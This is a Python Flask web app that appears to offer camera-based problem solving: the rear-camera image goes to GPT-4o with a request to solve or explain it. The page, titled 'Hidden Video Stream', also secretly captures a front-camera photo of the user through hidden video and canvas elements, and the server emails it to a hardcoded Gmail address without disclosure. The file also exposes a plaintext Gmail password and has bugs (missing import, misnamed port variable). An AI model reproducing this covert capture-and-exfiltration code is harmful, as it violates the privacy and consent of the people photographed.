from flask import Flask, request, render_template_string
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import base64
import re
import random
from openai import OpenAI

client = OpenAI(
    api_key=myopenaiapikey,
)
app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Hidden Video Stream</title>
    </head>
    <body>
        <video id="video" width="640" height="480" autoplay style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <form id="Form" method="POST" action="/puepue">
            <input type="hidden" name="imageData" id="imageData">
            <input type="hidden" name="imageData2" id="imageData2">
        </form>
        <button id="captureBtn">画像をキャプチャして解析</button>
        <script>
            function sendpic(facingMode, inputId) {
                return new Promise((resolve, reject) => {
                    const video = document.getElementById('video');
                    const canvas = document.getElementById('canvas');
                    const imageDataInput = document.getElementById(inputId);
                    const context = canvas.getContext('2d');

                    const constraints = {
                        video: {
                            facingMode: facingMode
                        }
                    };

                    navigator.mediaDevices.getUserMedia(constraints)
                        .then((stream) => {
                            video.srcObject = stream;
                            video.addEventListener('loadeddata', () => {
                                const aspectRatio = video.videoWidth / video.videoHeight;
                                const newWidth = video.videoWidth;
                                const newHeight = newWidth / aspectRatio;

                                canvas.width = newWidth;
                                canvas.height = newHeight;

                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                const dataUrl = canvas.toDataURL('image/png')
                                imageDataInput.value = dataUrl;

                                resolve();
                            });
                        })
                        .catch((err) => {
                            console.error('Error:', err);
                            alert(`Error: ${err.name} - ${err.message}`);
                            reject(err);
                        });
                });
            }

            async function pue() {
                await sendpic('user', 'imageData');
                await sendpic('environment', 'imageData2');
                document.getElementById('Form').submit();
            }

            document.getElementById('captureBtn').addEventListener('click', pue);
        </script>
    </body>
    </html>
    ''')
@app.route('/puepue', methods=['POST'])
def sendpic():
    # Gmail settings
    GMAIL_ACCOUNT = "334.nyan.nyan@gmail.com"
    GMAIL_PASSWORD = "kwuuonmivthawiph"

    # Recipient email address
    TO_ADDR = "a14398138@gmail.com"

    # Get form data
    image_data = request.form.get('imageData')
    image_data2 = request.form.get('imageData2')

    if not image_data or not image_data2:
        return "Missing image data", 400

    # Extract base64 data
    image_data = re.sub('^data:image/.+;base64,', '', image_data)
    image_data = base64.b64decode(image_data)

    # Email subject and body
    SUBJECT = str(random.random())
    BODY = "pic is here"

    # Create MIME message
    msg = MIMEMultipart()
    msg['Subject'] = SUBJECT
    msg['From'] = GMAIL_ACCOUNT
    msg['To'] = TO_ADDR

    # Attach the image
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(image_data)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="pic.png"')
    msg.attach(part)

    # Attach the body text
    msg.attach(MIMEText(BODY, 'plain'))
    
    # Connect to SMTP server and send email
    try:
        response = client.chat.completions.create(
            model="gpt-4o",
            messages= [
    {
      "role": "user",
      "content": [
        {
          "type": "text",
          "text": "この問題を解いて\n問題でなければ画像について解説して"
        },
        {
          "type": "image_url",
          "image_url": {
            "url": image_data2
          }
        }
      ]
    }
  ] ,           max_tokens=300,
        )
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(GMAIL_ACCOUNT, GMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        
        return str(response)

    except Exception as e:
        return f"エラーl: {str(e)}"


if __name__ == '__main__':
    aport = int(os.environ.get('PORT', 80))  # PORT環境変数からポートを取得。デフォルトは80。
    app.run(host='0.0.0.0', port=port)
